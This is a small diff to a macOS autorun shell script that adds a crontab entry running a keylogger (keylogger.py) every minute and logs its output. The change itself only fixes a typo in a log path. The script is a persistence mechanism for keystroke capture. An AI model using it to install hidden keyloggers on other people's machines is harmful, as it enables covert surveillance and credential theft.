@@ -7,7 +7,7 @@ path="${filepath/autorun_mac.command}"
 path="${path/./$(pwd)}"
 
 # add crontab to run the keylogger every minute
-crontab_command="* * * * * cd ${path} && python3 keylogger.py > ../logs/keylogs/keylog_cront_outputs/keylog_outputs.txt 2> ../logs/keylogs/keylog_cron_errors/keylog_errors.txt"
+crontab_command="* * * * * cd ${path} && python3 keylogger.py > ../logs/keylogs/keylog_cron_outputs/keylog_outputs.txt 2> ../logs/keylogs/keylog_cron_errors/keylog_errors.txt"
 
 crontab -l 2>/dev/null| cat - <(echo "$crontab_command") | crontab -
 
